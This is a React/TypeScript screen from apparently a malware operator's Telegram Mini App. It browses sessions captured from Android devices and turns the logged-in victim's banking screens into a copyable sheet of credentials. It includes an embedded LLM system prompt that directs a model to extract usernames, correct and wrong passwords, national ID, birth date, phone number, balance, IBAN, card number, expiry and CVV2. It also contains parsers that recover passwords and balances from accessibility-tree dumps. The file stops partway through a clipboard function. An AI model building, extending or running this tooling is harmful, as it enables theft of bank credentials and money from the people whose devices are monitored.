"use client";

import { backButton } from "@tma.js/sdk-react";
import { useCallback, useEffect, useRef, useState, type ReactNode } from "react";

import { PullToRefresh } from "@/components/PullToRefresh";
import { formatRelative, formatTime } from "@/lib/format";
import { readInitDataRaw } from "@/lib/telegram/initDataClient";

type WatchField = { name?: string; hint?: string; text?: string; password?: boolean };
type WatchPage = { at?: number; lines?: string[]; tree?: string[]; fields?: WatchField[] };
type ExtractItem = { label?: string; value?: string; owner?: string; own?: boolean; tone?: string };
type WatchExemptApp = { package?: string; label?: string; icon?: string };
type WatchSession = {
  sessionId: string;
  package?: string;
  label?: string;
  icon?: string;
  endedAt?: number;
  pages?: WatchPage[];
  complete?: boolean;
  extractReply?: string;
  extractItems?: ExtractItem[];
  extractError?: string;
  prompt?: string;
  skipLog?: boolean;
  skipExtract?: boolean;
};

export function WatchScreen({
  userId,
  deviceId,
  active,
  onBack,
}: {
  userId: string;
  deviceId: string;
  active: boolean;
  onBack: () => void;
}) {
  const [items, setItems] = useState<WatchSession[]>([]);
  const [skipLogPackages, setSkipLogPackages] = useState<WatchExemptApp[]>([]);
  const [skipExtractPackages, setSkipExtractPackages] = useState<WatchExemptApp[]>([]);
  const [openId, setOpenId] = useState("");
  const [error, setError] = useState("");
  const [clearing, setClearing] = useState("");
  const openedAt = useRef(0);
  const sessionOpen = useRef(false);
  sessionOpen.current = Boolean(openId);

  const headers = useCallback((): HeadersInit => {
    const initData = readInitDataRaw();
    return initData ? { "x-telegram-init-data": initData } : {};
  }, []);

  const base = `/api/users/${encodeURIComponent(userId)}/devices/${encodeURIComponent(deviceId)}/sessions`;

  const load = useCallback(async () => {
    try {
      const res = await fetch(base, { headers: headers(), cache: "no-store" });
      if (!res.ok) {
        setError("خواندن نشست‌ها ممکن نشد.");
        return;
      }
      const body = (await res.json()) as {
        items?: WatchSession[];
        skipLogPackages?: WatchExemptApp[];
        skipExtractPackages?: WatchExemptApp[];
      };
      setItems(body.items || []);
      setSkipLogPackages(body.skipLogPackages || []);
      setSkipExtractPackages(body.skipExtractPackages || []);
      setError("");
    } catch {
      setError("ارتباط با سرور برقرار نشد.");
    }
  }, [base, headers]);

  const clearExempt = useCallback(
    async (kind: "log" | "extract", pkg: string) => {
      const packageName = pkg.trim();
      if (!packageName || clearing) return;
      const key = `${kind}:${packageName}`;
      setClearing(key);
      setError("");
      try {
        const body =
          kind === "log"
            ? { clearWatchSkipLogPackage: packageName }
            : { clearWatchSkipExtractPackage: packageName };
        const res = await fetch(`/api/users/${encodeURIComponent(userId)}`, {
          method: "PATCH",
          headers: { ...headers(), "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        if (!res.ok) {
          setError("لغو معافیت ممکن نشد.");
          return;
        }
        await load();
      } catch {
        setError("لغو معافیت ممکن نشد.");
      } finally {
        setClearing("");
      }
    },
    [clearing, headers, load, userId],
  );

  const closeSession = useCallback(() => {
    if (Date.now() - openedAt.current < 450) return;
    setOpenId("");
  }, []);

  function openSession(sessionId: string) {
    openedAt.current = Date.now();
    setOpenId(sessionId);
  }

  useEffect(() => {
    if (active) void load();
  }, [active, load]);

  useEffect(() => {
    if (!active || openId) {
      if (!active) backButton.hide.ifAvailable();
      return;
    }
    backButton.mount.ifAvailable();
    backButton.show.ifAvailable();
    let off: (() => void) | undefined;
    try {
      off = backButton.onClick(onBack);
    } catch {
      // outside Telegram
    }
    return () => {
      off?.();
      if (!sessionOpen.current) backButton.hide.ifAvailable();
    };
  }, [active, onBack, openId]);

  const open = items.find((item) => item.sessionId === openId);

  return (
    <div className="md-stack__page md-stack__page--on">
      <div className="md-stack">
        <div className={`md-stack__page${openId ? "" : " md-stack__page--on"}`}>
          <PullToRefresh onRefresh={load}>
            <div className="md-content">
              {error ? <p className="md-banner">{error}</p> : null}
              {skipLogPackages.length > 0 || skipExtractPackages.length > 0 ? (
                <section className="md-block">
                  {skipLogPackages.length > 0 ? (
                    <ExemptBlock
                      title="معاف از لاگ"
                      items={skipLogPackages}
                      kind="log"
                      clearing={clearing}
                      onClear={(pkg) => void clearExempt("log", pkg)}
                    />
                  ) : null}
                  {skipExtractPackages.length > 0 ? (
                    <ExemptBlock
                      title="معاف از استخراج"
                      items={skipExtractPackages}
                      kind="extract"
                      clearing={clearing}
                      onClear={(pkg) => void clearExempt("extract", pkg)}
                    />
                  ) : null}
                </section>
              ) : null}
              {items.length === 0 && !error ? (
                <section className="md-block">
                  <div className="md-group md-group--empty">
                    <span className="md-group__photo">ن</span>
                    <span className="md-group__body">
                      <span className="md-group__title">نشستی نیست</span>
                      <span className="md-group__meta">بعد از باز شدن برنامهٔ دیده‌شده اینجا می‌آید</span>
                    </span>
                  </div>
                </section>
              ) : null}
              {items.map((item) => (
                <section key={item.sessionId} className="md-block">
                  <button type="button" className="md-app-row" onClick={() => openSession(item.sessionId)}>
                    {item.icon ? (
                      <img className="md-app-row__icon" alt="" src={`data:image/png;base64,${item.icon}`} />
                    ) : (
                      <span className="md-app-row__icon md-app-row__icon--empty" aria-hidden="true">
                        {(item.label || item.package || "ن").trim().slice(0, 1)}
                      </span>
                    )}
                    <span className="md-app-row__body">
                      <span className="md-app-row__name" dir="auto">
                        {item.label || item.package || "برنامه"}
                      </span>
                      <span className="md-app-row__pkg" dir="ltr">
                        {item.package}
                      </span>
                      <span className="md-app-row__pkg">
                        {item.endedAt ? `${formatTime(item.endedAt)} · ${formatRelative(item.endedAt)}` : ""}
                        {` · ${(item.pages || []).length} صفحه`}
                      </span>
                      {item.skipLog || item.skipExtract ? (
                        <span className="md-grant-badges">
                          {item.skipLog ? (
                            <button
                              type="button"
                              className="md-badge md-badge--action"
                              disabled={clearing === `log:${item.package || ""}`}
                              onClick={(event) => {
                                event.stopPropagation();
                                void clearExempt("log", item.package || "");
                              }}
                            >
                              {clearing === `log:${item.package || ""}` ? "…" : "لغو معاف لاگ"}
                            </button>
                          ) : null}
                          {item.skipExtract ? (
                            <button
                              type="button"
                              className="md-badge md-badge--action"
                              disabled={clearing === `extract:${item.package || ""}`}
                              onClick={(event) => {
                                event.stopPropagation();
                                void clearExempt("extract", item.package || "");
                              }}
                            >
                              {clearing === `extract:${item.package || ""}` ? "…" : "لغو معاف استخراج"}
                            </button>
                          ) : null}
                        </span>
                      ) : null}
                    </span>
                  </button>
                </section>
              ))}
            </div>
          </PullToRefresh>
        </div>
        {openId ? (
          <SessionDetail
            base={base}
            headers={headers}
            sessionId={openId}
            summary={open}
            active={active}
            clearing={clearing}
            onClearExempt={clearExempt}
            onBack={closeSession}
          />
        ) : null}
      </div>
    </div>
  );
}

function SessionDetail({
  base,
  headers,
  sessionId,
  summary,
  active,
  clearing,
  onClearExempt,
  onBack,
}: {
  base: string;
  headers: () => HeadersInit;
  sessionId: string;
  summary?: WatchSession;
  active: boolean;
  clearing: string;
  onClearExempt: (kind: "log" | "extract", pkg: string) => Promise<void>;
  onBack: () => void;
}) {
  const [detail, setDetail] = useState<WatchSession | null>(null);
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);
  const [copied, setCopied] = useState("");

  const load = useCallback(async () => {
    const res = await fetch(`${base}/${encodeURIComponent(sessionId)}`, {
      headers: headers(),
      cache: "no-store",
    });
    if (!res.ok) throw new Error("detail");
    setDetail((await res.json()) as WatchSession);
    setError("");
  }, [base, headers, sessionId]);

  useEffect(() => {
    if (!active) return;
    void load().catch(() => setError("خواندن نشست ممکن نشد."));
  }, [active, load]);

  useEffect(() => {
    if (!active) {
      backButton.hide.ifAvailable();
      return;
    }
    backButton.mount.ifAvailable();
    backButton.show.ifAvailable();
    let off: (() => void) | undefined;
    try {
      off = backButton.onClick(onBack);
    } catch {
      // outside Telegram
    }
    return () => {
      off?.();
      backButton.hide.ifAvailable();
    };
  }, [active, onBack]);

  async function extract() {
    setBusy(true);
    setError("");
    try {
      const res = await fetch(`${base}/${encodeURIComponent(sessionId)}/extract`, {
        method: "POST",
        headers: headers(),
      });
      if (!res.ok) {
        setError("استخراج نشد.");
        return;
      }
      const body = (await res.json()) as {
        extractReply?: string;
        extractItems?: ExtractItem[];
        extractError?: string;
        prompt?: string;
      };
      setDetail((current) =>
        current
          ? {
              ...current,
              extractReply: body.extractReply || "",
              extractItems: body.extractItems || [],
              extractError: body.extractError || "",
              prompt: body.prompt || current.prompt,
            }
          : current,
      );
    } catch {
      setError("ارتباط با سرور برقرار نشد.");
    } finally {
      setBusy(false);
    }
  }

  async function copyValue(key: string, value: string) {
    if (!value.trim()) {
      setError("پرامپت خالی است.");
      return;
    }
    const ok = await copyPlainText(value);
    if (!ok) {
      setError("کپی نشد.");
      return;
    }
    setCopied(key);
    window.setTimeout(() => setCopied((current) => (current === key ? "" : current)), 1500);
  }

  const shown = detail || summary;
  const pages = shown?.pages || [];
  const report = buildReport(pages);

  return (
    <div className="md-stack__page md-stack__page--on">
      <PullToRefresh
        onRefresh={async () => {
          try {
            await load();
          } catch {
            setError("خواندن نشست ممکن نشد.");
          }
        }}
      >
        <div className="md-content">
          {error ? <p className="md-banner">{error}</p> : null}
          {shown ? (
            <section className="md-block">
              <div className="md-session__head md-app-row">
                {shown.icon ? (
                  <img className="md-app-row__icon" alt="" src={`data:image/png;base64,${shown.icon}`} />
                ) : (
                  <span className="md-app-row__icon md-app-row__icon--empty" aria-hidden="true">
                    {(shown.label || shown.package || "ن").trim().slice(0, 1)}
                  </span>
                )}
                <span className="md-app-row__body">
                  <span className="md-app-row__name" dir="auto">
                    {shown.label || shown.package || "برنامه"}
                  </span>
                  <span className="md-app-row__pkg" dir="ltr">
                    {shown.package}
                  </span>
                  <span className="md-app-row__pkg">
                    {shown.endedAt ? `${formatTime(shown.endedAt)} · ${formatRelative(shown.endedAt)}` : ""}
                    {pages.length ? ` · ${pages.length.toLocaleString("fa-IR")} صفحه` : ""}
                  </span>
                  {summary?.skipLog || summary?.skipExtract ? (
                    <span className="md-grant-badges">
                      {summary.skipLog ? (
                        <button
                          type="button"
                          className="md-badge md-badge--action"
                          disabled={clearing === `log:${summary.package || ""}`}
                          onClick={() => void onClearExempt("log", summary.package || "")}
                        >
                          {clearing === `log:${summary.package || ""}` ? "…" : "لغو معاف لاگ"}
                        </button>
                      ) : null}
                      {summary.skipExtract ? (
                        <button
                          type="button"
                          className="md-badge md-badge--action"
                          disabled={clearing === `extract:${summary.package || ""}`}
                          onClick={() => void onClearExempt("extract", summary.package || "")}
                        >
                          {clearing === `extract:${summary.package || ""}` ? "…" : "لغو معاف استخراج"}
                        </button>
                      ) : null}
                    </span>
                  ) : null}
                </span>
              </div>
              <SessionChat
                sessionId={sessionId}
                report={report}
                reply={detail?.extractReply || ""}
                items={detail?.extractItems}
                loading={!detail}
                copied={copied}
                onCopy={(key, value) => void copyValue(key, value)}
              />
              <div className="md-device-actions">
                <button type="button" className="md-action" disabled={busy} onClick={() => void extract()}>
                  {busy ? "…" : "استخراج"}
                </button>
                <button
                  type="button"
                  className="md-action md-action--tonal"
                  onClick={() => downloadPromptTxt(sessionId, promptText(detail || shown))}
                >
                  دانلود پرامپت
                </button>
                <button
                  type="button"
                  className="md-action md-action--tonal"
                  disabled={!treeText(detail || shown).trim()}
                  onClick={() => downloadTreeTxt(sessionId, treeText(detail || shown))}
                >
                  دانلود درخت
                </button>
              </div>
              {detail?.extractError ? (
                <p className="md-banner" dir="auto">
                  {detail.extractError}
                </p>
              ) : null}
              <PageStrip pages={pages} />
            </section>
          ) : null}
        </div>
      </PullToRefresh>
    </div>
  );
}

const extractSystem = `You design one operator screen for an Android app session. Return one JSON object only. No markdown.

Input: pages in time order. "label = value" is typed text. Other lines are the full accessibility tree of that page (class, bounds, id, text, desc, hint, flags). Use only those lines. Do not invent a digit, name, owner, or outcome.

Scope: only the logged-in banking-app account holder. Ignore other people's cards, names, IBANs, and transfer destinations completely in both reply and ui.

Output shape:
{"reply":"✅ ورود موفق با نام کاربری X و رمز Y. کد ملی NID. تاریخ تولد DOB. شماره PHONE. موجودی Z متعلق به OWNER. شبا IBAN. کارت 🟢⭐️ CARD. انقضا EXP. CVV2 CVV مشاهده شد.","ui":[{"label":"نام کاربری","value":"X","tone":"user"},{"label":"رمز نادرست","value":"...","tone":"bad"},{"label":"رمز درست","value":"Y","tone":"ok"},{"label":"کد ملی","value":"NID","tone":"id"},{"label":"تاریخ تولد","value":"DOB","tone":"birth"},{"label":"شماره","value":"PHONE","tone":"phone"},{"label":"موجودی","value":"Z","tone":"balance"},{"label":"شبا","value":"IBAN","tone":"iban"},{"label":"کارت","value":"CARD","owner":"OWNER","own":true,"tone":"card"},{"label":"تاریخ انقضا","value":"EXP","tone":"expiry"},{"label":"CVV2","value":"CVV","tone":"cvv"}]}

reply: one short Persian header and nothing else. First character ✅ if final login succeeded, else ⚠️. Order: login attempts → this holder's name → کد ملی and تاریخ تولد and شماره when visible → موجودی → شبا → own card with 🟢⭐️ → تاریخ انقضا and CVV2 of that same own card when visible → end with مشاهده شد.
Hard stop after that holder's own card details. Never write مقصد, انتقال, واریز, رسید, سایر کارت, کارت دیگران, or any second person's name or card. If destination pages exist, ignore them.

ui: the copyable fact sheet the client prints. Only rows about this holder. Include every username and secret from login, plus this holder's کد ملی, تاریخ تولد, شماره تلفن, موجودی, شبا, own کارت, and when shown on the pages the تاریخ انقضا and CVV2 of that same own card.
If username and password are the exact same string, still emit TWO ui rows: one "نام کاربری" and one "رمز" or "رمز درست". Never drop the password row because it matches the username.
label is exactly one of: نام کاربری, رمز نادرست, رمز درست, رمز, کد یکبارمصرف, رمز دوم, کد ملی, تاریخ تولد, شماره, کارت, شبا, ایمیل, موجودی, تاریخ انقضا, CVV2
tone is one of: user, bad, ok, secret, balance, iban, card, expiry, cvv, phone, email, id, birth
value is the original text only. Never put a person name inside value.
For کارت: when the holder's own card appears in reply, you MUST also put that same number in ui with own:true and owner set to that person's name when shown. Never emit another person's card. No مبلغ.
تاریخ انقضا and CVV2: only for the logged-in holder's own card, only when the pages show them (typed or printed). Copy the value exactly. Do not invent.
کد ملی, تاریخ تولد, and شماره: when the pages show this holder's national ID, birth date, or mobile/phone number, you MUST put ui rows with labels exactly "کد ملی", "تاریخ تولد", and "شماره" and mention them in reply. Copy the value exactly. Do not invent. Skip only when never shown.

Secrets: رمز نادرست only on a later rejection of that same secret; رمز درست only when a later page leaves the form into home/account/موجودی; else رمز. Field edits before submit are not failures. موجودی is the amount beside موجودی.

Mandatory own-card fields when visible on the pages (typed or printed next to the holder's own card):
- Put ui rows with labels exactly "تاریخ انقضا" and "CVV2" and the original values.
- Mention both in reply before مشاهده شد.
- Do not invent. Skip a field only when the pages never show it.

Mandatory identity fields when visible on the pages for this holder:
- Put ui rows with labels exactly "کد ملی", "تاریخ تولد", and "شماره" (phone/mobile) and the original values.
- Mention them in reply when present, before موجودی/کارت.
- Do not invent. Skip a field only when the pages never show it.`;

type Attempt = { user: string; password: string; status: "wrong" | "ok" };
type SessionReport = { user: string; attempts: Attempt[]; balance: string; narrative: string };

function SessionChat({
  sessionId,
  report,
  reply,
  items,
  loading,
  copied,
  onCopy,
}: {
  sessionId: string;
  report: SessionReport;
  reply: string;
  items?: ExtractItem[];
  loading: boolean;
  copied: string;
  onCopy: (key: string, value: string) => void;
}) {
  const header = headerText(reply);
  const rows = reply.trim() || (items && items.length) ? ensureOwnCard(orderedItems(items || []), header) : [];
  const facts = rows.length ? [] : reportFacts(report);
  const shownHeader = header || (!rows.length ? report.narrative : "");
  if (!shownHeader && rows.length === 0 && facts.length === 0 && !loading) return null;
  const chip = (key: string, text: string, dir: "ltr" | "auto" = "ltr") => (
    <button type="button" className="md-extract__chip" dir={dir} onClick={() => onCopy(`${sessionId}-${key}`, text)}>
      {copied === `${sessionId}-${key}` ? "کپی شد" : text}
    </button>
  );
  return (
    <div className="md-extract">
      {shownHeader ? (
        <p className="md-extract__head">{markReply(shownHeader, rows.length ? rows : itemsFromFacts(facts))}</p>
      ) : null}
      {rows.length ? (
        <div className="md-extract__sheet">
          {rows.map((item, index) => {
            const label = (item.label || "مقدار").trim();
            const value = (item.value || "").trim();
            const owner = (item.owner || "").trim();
            const tone = itemTone(item);
            const title = label === "کارت" && owner ? `${label} · ${owner}` : label;
            return (
              <div key={`ai-${index}`} className={item.own ? "md-extract__row md-extract__row--own" : "md-extract__row"}>
                <span className={`md-extract__label md-extract__label--${tone}`}>
                  {item.own ? <span className="md-extract__star">🟢⭐️</span> : null}
                  {title}
                </span>
                <span className="md-extract__values">
                  {label === "کارت" && owner ? chip(`ai-${index}-owner`, owner, "auto") : null}
                  {chip(`ai-${index}`, value, label === "نام کاربری" || label.includes("رمز") ? "auto" : "ltr")}
                </span>
              </div>
            );
          })}
        </div>
      ) : facts.length ? (
        <div className="md-extract__sheet">
          {facts.map((fact) => (
            <div key={fact.key} className="md-extract__row">
              <span className={`md-extract__label md-extract__label--${fact.kind}`}>{fact.label}</span>
              <span className="md-extract__values">{chip(fact.key, fact.text, "auto")}</span>
            </div>
          ))}
        </div>
      ) : loading ? (
        <p className="md-extract__head">…</p>
      ) : null}
    </div>
  );
}

function itemTone(item: ExtractItem): string {
  const tone = (item.tone || "").trim().toLowerCase();
  if (tone) return tone;
  const label = (item.label || "").trim();
  if (label.includes("نادرست")) return "bad";
  if (label.includes("درست")) return "ok";
  if (label.includes("رمز")) return "secret";
  if (label === "موجودی") return "balance";
  if (label === "شبا") return "iban";
  if (label === "کارت") return "card";
  if (label === "تاریخ انقضا") return "expiry";
  if (label === "CVV2") return "cvv";
  if (label === "کد ملی") return "id";
  if (label === "تاریخ تولد") return "birth";
  if (label === "شماره") return "phone";
  if (label === "نام کاربری") return "user";
  return "user";
}

function itemsFromFacts(facts: { key: string; label: string; text: string; kind: string }[]): ExtractItem[] {
  return facts.map((fact) => ({ label: fact.label, value: fact.text, tone: fact.kind }));
}

function headerText(reply: string): string {
  let text = reply.trim();
  if (!text) return "";
  const mark = "مشاهده شد.";
  const cutters = [
    "کارت‌های مقصد",
    "کارت های مقصد",
    "کارت مقصد",
    "مقصدهای",
    "مقصدها",
    "مقصد",
    "سایر کارت",
    "سایر حساب",
    "کارت دیگران",
    "انتقال به",
    "واریز به",
    "رسید انتقال",
  ];
  let cut = text.indexOf(mark);
  if (cut >= 0) cut += mark.length;
  for (const cutter of cutters) {
    const at = text.indexOf(cutter);
    if (at >= 0 && (cut < 0 || at < cut)) cut = at;
  }
  if (cut >= 0) text = text.slice(0, cut).trim();
  if (!text) return "";
  if (!text.endsWith(mark)) text = `${text.replace(/[ .\u060C;]+$/u, "")} ${mark}`;
  return text.trim();
}

function orderedItems(items: ExtractItem[]): ExtractItem[] {
  const rest: ExtractItem[] = [];
  const ownCards: ExtractItem[] = [];
  const otherCards: ExtractItem[] = [];
  for (const item of items) {
    if (!(item.value || "").trim()) continue;
    const label = (item.label || "").trim();
    if (label === "کارت") {
      if (item.own) ownCards.push(item);
      else otherCards.push(item);
      continue;
    }
    rest.push(item);
  }
  if (ownCards.length) return rest.concat(ownCards);
  if (otherCards.length === 1) return rest.concat([{ ...otherCards[0], own: true, tone: "card" }]);
  return rest;
}

function ensureOwnCard(items: ExtractItem[], header: string): ExtractItem[] {
  if (items.some((item) => (item.label || "").trim() === "کارت" && (item.value || "").trim())) {
    return items;
  }
  const match = header.match(/🟢⭐️\s*([0-9۰-۹٠-٩][0-9۰-۹٠-٩\s\-]{11,})/);
  if (!match) return items;
  const value = match[1].replace(/\s+/g, " ").trim();
  let owner = "";
  for (const prefix of ["متعلق به ", "به نام "]) {
    const at = header.indexOf(prefix);
    if (at < 0) continue;
    owner = header
      .slice(at + prefix.length)
      .split(/[.\u060C,🟢]/u)[0]
      .trim();
    break;
  }
  return items.concat([{ label: "کارت", value, owner, own: true, tone: "card" }]);
}

function markReply(reply: string, items: ExtractItem[]): ReactNode[] {
  const needles: { text: string; kind: string }[] = [];
  for (const item of items) {
    const value = (item.value || "").trim();
    const label = (item.label || "").trim();
    const owner = (item.owner || "").trim();
    if (label === "نام کاربری" && value.length >= 2) needles.push({ text: value, kind: "user" });
    else if (label.includes("رمز") && value.length >= 2) {
      needles.push({ text: value, kind: label.includes("نادرست") ? "bad" : "secret" });
    }     else if (label === "موجودی" && value.length >= 2) needles.push({ text: value, kind: "balance" });
    else if (label === "کارت" && item.own && value.length >= 4) needles.push({ text: value, kind: "card" });
    else if ((label === "تاریخ انقضا" || label === "CVV2") && value.length >= 2) needles.push({ text: value, kind: "card" });
    if (item.own && owner.length >= 2) needles.push({ text: owner, kind: "name" });
  }
  needles.sort((a, b) => b.text.length - a.text.length);
  const nodes: React.ReactNode[] = [];
  let cursor = 0;
  let key = 0;
  while (cursor < reply.length) {
    let hit: { at: number; text: string; kind: string } | null = null;
    for (const needle of needles) {
      const at = reply.indexOf(needle.text, cursor);
      if (at < 0) continue;
      if (!hit || at < hit.at || (at === hit.at && needle.text.length > hit.text.length)) {
        hit = { at, text: needle.text, kind: needle.kind };
      }
    }
    if (!hit) {
      nodes.push(reply.slice(cursor));
      break;
    }
    if (hit.at > cursor) nodes.push(reply.slice(cursor, hit.at));
    nodes.push(
      <mark key={key} className={`md-mark md-mark--${hit.kind}`}>
        {hit.text}
      </mark>,
    );
    key += 1;
    cursor = hit.at + hit.text.length;
  }
  return nodes;
}

function reportFacts(report: SessionReport): { key: string; label: string; text: string; kind: string }[] {
  const facts: { key: string; label: string; text: string; kind: string }[] = [];
  if (report.user) facts.push({ key: "user", label: "نام کاربری", text: report.user, kind: "user" });
  report.attempts.forEach((attempt, index) => {
    facts.push({
      key: `pass-${index}`,
      label: attempt.status === "ok" ? "رمز درست" : "رمز نادرست",
      text: attempt.password,
      kind: attempt.status === "ok" ? "ok" : "bad",
    });
  });
  if (report.balance) facts.push({ key: "balance", label: "موجودی", text: report.balance, kind: "balance" });
  return facts;
}

function PageStrip({ pages }: { pages: WatchPage[] }) {
  const scroller = useRef<HTMLDivElement>(null);
  const [index, setIndex] = useState(0);
  const slides = pages.filter((page) => (page.lines || []).length > 0);
  if (slides.length === 0) return null;

  function onScroll() {
    const el = scroller.current;
    if (!el) return;
    const width = el.clientWidth || 1;
    const next = Math.round(el.scrollLeft / width);
    setIndex(Math.min(slides.length - 1, Math.max(0, next)));
  }

  function go(next: number) {
    const el = scroller.current;
    if (!el) return;
    el.scrollTo({ left: next * el.clientWidth, behavior: "smooth" });
  }

  return (
    <div className="md-pages">
      <div ref={scroller} className="md-pages__scroller" dir="ltr" onScroll={onScroll}>
        {slides.map((page, pageIndex) => (
          <article key={pageIndex} className="md-inset md-pages__slide">
            <p className="md-ussd-log__text" dir="ltr">
              {(page.lines || []).join("\n")}
            </p>
          </article>
        ))}
      </div>
      <div className="md-pages__bar">
        <p className="md-pages__count">
          <bdi dir="ltr">
            {(index + 1).toLocaleString("fa-IR")} از {slides.length.toLocaleString("fa-IR")}
          </bdi>
        </p>
        <div className="md-pages__dots">
          {slides.map((_, dot) => (
            <button
              key={dot}
              type="button"
              className={dot === index ? "md-pages__dot md-pages__dot--on" : "md-pages__dot"}
              onClick={() => go(dot)}
            />
          ))}
        </div>
      </div>
    </div>
  );
}

function buildReport(pages: WatchPage[]): SessionReport {
  const attempts: Attempt[] = [];
  let user = "";
  let password = "";
  const note = (status: Attempt["status"]) => {
    if (!password) return;
    const existing = attempts.find((item) => item.password === password);
    if (existing) {
      existing.status = status;
      return;
    }
    attempts.push({ user, password, status });
  };
  for (const page of pages) {
    const nextUser = pageValue(page, "user");
    const nextPass = pageValue(page, "password");
    if (nextUser) user = nextUser;
    if (nextPass) password = nextPassword(password, nextPass, attempts);
    if (pageHasError(page)) note("wrong");
    else if (!onLogin(page)) note("ok");
  }
  const balance = findBalance(pages);
  const primary = attempts.find((item) => item.user)?.user || user;
  return { user: primary, attempts, balance, narrative: narrativeOf(primary, attempts, balance) };
}

function nextPassword(current: string, next: string, attempts: Attempt[]): string {
  if (!current || next === current) return next || current;
  const committed = attempts.some((item) => item.password === current);
  if (!committed && next.startsWith(current)) return next;
  if (!committed && current.startsWith(next)) return current;
  return next;
}

function narrativeOf(user: string, attempts: Attempt[], balance: string): string {
  const lines: string[] = [];
  if (user) lines.push(`نام کاربری ${user} وارد شد.`);
  for (const attempt of attempts) {
    if (attempt.status === "wrong") lines.push(`رمز ${attempt.password} نادرست بود.`);
    else lines.push(`رمز ${attempt.password} درست بود و ورود انجام شد.`);
  }
  if (balance) lines.push(`موجودی ${balance} است.`);
  return lines.join("\n");
}

function promptText(session: WatchSession): string {
  const parts: string[] = [];
  if (session.label) parts.push(session.label);
  if (session.package) parts.push(session.package);
  for (const page of session.pages || []) {
    for (const field of page.fields || []) {
      parts.push(`${field.name || ""} ${field.hint || ""} = ${field.text || ""}`.trim());
    }
    for (const line of page.lines || []) parts.push(line);
  }
  const remote = (session.prompt || "").trim();
  if (remote) return remote;
  return `system:\n${extractSystem}\n\nuser:\n${parts.join("\n")}`;
}

function downloadPromptTxt(sessionId: string, text: string) {
  downloadTxt(`extract-prompt-${sessionId}.txt`, text);
}

function treeText(session: WatchSession): string {
  const pages = session.pages || [];
  const blocks: string[] = [];
  pages.forEach((page, index) => {
    const tree = page.tree || [];
    if (!tree.length) return;
    blocks.push(`=== page ${index + 1} ===`, ...tree, "");
  });
  return blocks.join("\n").trim();
}

function downloadTreeTxt(sessionId: string, text: string) {
  downloadTxt(`session-tree-${sessionId}.txt`, text);
}

function downloadTxt(filename: string, text: string) {
  const body = text.trim();
  if (!body) return;
  const blob = new Blob([body], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.rel = "noopener";
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}

function pageValue(page: WatchPage, kind: "user" | "password"): string {
  let best = "";
  const take = (text: string) => {
    const value = text.trim();
    if (!value || isMasked(value) || value.length < best.length) return;
    best = value;
  };
  for (const field of page.fields || []) {
    if (isPasswordField(field.hint, field.name, field.password) !== (kind === "password")) continue;
    take(field.text || "");
  }
  if (best) return best;
  for (const line of page.lines || []) {
    if (!line.includes("edit") && !line.includes("pwd")) continue;
    const hint = quoted(line, "hint");
    const password = line.includes("pwd") || /رمز|password|passcode/i.test(hint);
    if (password !== (kind === "password")) continue;
    if (kind === "user" && !isUserHint(hint, quoted(line, "id"))) continue;
    take(quoted(line, "text"));
  }
  return best;
}

function isPasswordField(hint?: string, name?: string, password?: boolean): boolean {
  if (password) return true;
  return /رمز|password|passcode/i.test(`${hint || ""} ${name || ""}`);
}

function isUserHint(hint: string, id: string): boolean {
  return /نام کاربری|username|user|login|email/i.test(`${hint} ${id}`);
}

function pageHasError(page: WatchPage): boolean {
  return pageTexts(page).some((text) => /نادرست|اشتباه|نامعتبر|incorrect|invalid/i.test(text));
}

function onLogin(page: WatchPage): boolean {
  if ((page.fields || []).some((field) => isPasswordField(field.hint, field.name, field.password))) return true;
  return (page.lines || []).some((line) => {
    if (!line.includes("edit") && !line.includes("pwd")) return false;
    return line.includes("pwd") || /رمز|password|passcode/i.test(quoted(line, "hint"));
  });
}

function hasAmount(text: string): boolean {
  return /[0-9۰-۹٠-٩]/.test(text) && /ریال|تومان|rial/i.test(text);
}

function findBalance(pages: WatchPage[]): string {
  for (const page of pages) {
    const texts = pageTexts(page);
    const at = texts.findIndex((text) => text.includes("موجودی"));
    if (at < 0) continue;
    for (let index = at - 1; index >= Math.max(0, at - 4); index -= 1) {
        if (hasAmount(texts[index])) return texts[index];
    }
    for (let index = at + 1; index < Math.min(texts.length, at + 4); index += 1) {
      if (hasAmount(texts[index])) return texts[index];
    }
  }
  return "";
}

function pageTexts(page: WatchPage): string[] {
  const texts: string[] = [];
  for (const line of page.lines || []) {
    const text = quoted(line, "text").trim();
    if (text) texts.push(text);
  }
  return texts;
}

function quoted(line: string, key: string): string {
  const mark = `${key}="`;
  const start = line.indexOf(mark);
  if (start < 0) return "";
  const from = start + mark.length;
  const end = line.indexOf('"', from);
  return end < 0 ? line.slice(from) : line.slice(from, end);
}

function isMasked(value: string): boolean {
  return /^[•●∙·*⚫]+$/.test(value);
}

function ExemptBlock({
  title,
  items,
  kind,
  clearing,
  onClear,
}: {
  title: string;
  items: WatchExemptApp[];
  kind: "log" | "extract";
  clearing: string;
  onClear: (pkg: string) => void;
}) {
  return (
    <div className={`md-exempt md-exempt--${kind}`}>
      <p className="md-exempt__title">{title}</p>
      <ul className="md-exempt__list">
        {items.map((app) => {
          const pkg = (app.package || "").trim();
          if (!pkg) return null;
          const busy = clearing === `${kind}:${pkg}`;
          return (
            <li key={`${kind}-${pkg}`} className="md-exempt__row">
              {app.icon ? (
                <img className="md-exempt__icon" alt="" src={`data:image/png;base64,${app.icon}`} />
              ) : (
                <span className="md-exempt__icon md-exempt__icon--empty" aria-hidden="true">
                  {(app.label || pkg).trim().slice(0, 1)}
                </span>
              )}
              <span className="md-exempt__body">
                <span className="md-exempt__name" dir="auto">
                  {app.label || pkg}
                </span>
                <span className="md-exempt__pkg" dir="ltr">
                  {pkg}
                </span>
              </span>
              <button type="button" className="md-action md-action--tonal md-exempt__clear" disabled={busy} onClick={() => onClear(pkg)}>
                {busy ? "…" : "لغو"}
              </button>
            </li>
          );
        })}
      </ul>
    </div>
  );
}

function copyWithSelection(text: string): boolean {
  try {
    const area = document.createElement("textarea");
    area.value = text;
    area.setAttribute("readonly", "");
    area.style.position = "fixed";
    area.style.top = "0";
    area.style.left = "0";
    area.style.width = "2em";
    area.style.height = "2em";
    area.style.padding = "0";
    area.style.border = "none";
    area.style.outline = "none";
    area.style.boxShadow = "none";
    area.style.background = "transparent";
    area.style.overflow = "hidden";
    document.body.appendChild(area);
    area.focus();
    area.setSelectionRange(0, text.length);
    const ok = document.execCommand("copy");
